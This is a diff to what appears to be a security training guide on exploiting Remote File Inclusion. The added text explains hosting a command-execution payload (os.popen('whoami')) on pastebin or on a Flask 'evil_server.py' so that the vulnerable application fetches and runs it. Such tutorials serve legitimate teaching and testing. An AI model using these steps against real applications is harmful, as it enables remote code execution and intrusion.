@@ -81,7 +81,22 @@ When we will have a look in our intercepting proxy we can see that the applicati
 ![](.gitbook/assets/RFI3.png)
 
 
-To exploit an Remote File Inclusion vulnerability we need first to setup our on webserver so we are able to serve our own file. In this case i will use Python Flask to create a small webserver that serves my file. We name it evil_server.py
+To exploit Remote File Inclusion vulnerability, we have two approaches documented in detail below:
+
+
+1. Use pastebin.com to serve the file including system command and include the pastebin raw url:
+
+For E.g.: You may copy the code below to pastebin.com ans save. Then include the raw URL which would look something like "https://pastebin.com/raw/ZLeFHRNf":
+
+
+```
+os.popen('whoami').read()
+```
+
+![](.gitbook/assets/RFI31.png)
+
+2. Creating your own webserver: In this case you can use Python Flask to create a small webserver that serves your file. We name it evil_server.py
+
 
 ```python
 from flask import Flask, request, url_for, render_template, redirect
